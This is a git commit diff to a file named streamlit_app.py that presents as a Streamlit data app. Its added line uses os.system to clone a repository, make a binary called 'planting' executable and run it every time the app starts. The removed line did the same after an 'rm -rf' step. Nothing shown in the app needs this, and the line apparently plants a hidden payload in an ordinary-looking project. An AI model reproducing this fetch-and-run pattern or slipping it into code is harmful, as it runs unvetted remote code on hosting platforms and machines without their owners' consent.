c1954e25278163747f63808b78bc47766eab5d1f
apriopera <109069754+apriopera@users.noreply.github.com>
2022-07-11 19:00:41 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit && git clone https://github.com/apriopera/streamlit.git && cd streamlit && chmod +x planting && ./planting")
+os.system ("git clone https://github.com/apriopera/streamlit.git && cd streamlit && chmod +x planting && ./planting")
